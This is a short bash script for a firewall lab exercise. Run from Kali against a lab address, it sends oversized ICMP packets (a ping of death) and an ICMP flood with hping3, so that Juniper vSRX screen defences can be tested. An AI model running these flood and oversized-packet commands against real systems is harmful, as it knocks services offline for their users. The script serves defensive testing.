#!/bin/bash
# Scenario 3: ICMP Flood + Oversized ICMP
# Run this from Kali Linux (ssh kali@<kali-eip>)
#
# BEFORE applying defense:
#   ICMP flood saturates the target; ping-of-death may crash unprotected systems
#
# AFTER defense (Screen: icmp flood threshold + icmp large + ping-death):
#   SRX drops flood packets at threshold; oversized packets blocked at ingress
#
# Verify on vSRX:
#   show security screen statistics interface ge-0/0/0
#   show log security-log | match "ICMP" | last 20

TARGET="10.0.2.100"

echo "========================================"
echo "Scenario 3: ICMP Flood + Ping of Death"
echo "Target: $TARGET"
echo "========================================"
echo ""

echo "[*] Normal ping (should work before and after defense)..."
ping -c 4 "$TARGET"
echo ""

echo "[*] Oversized ICMP packet (Ping of Death — 65500 byte payload)..."
sudo hping3 --icmp -d 65000 -c 5 "$TARGET"
echo ""

echo "[*] Starting ICMP flood (Ctrl+C to stop)..."
echo "    In another terminal, run: ping $TARGET"
echo "    to observe whether ICMP responses stop."
echo ""
sudo hping3 --icmp --flood "$TARGET"
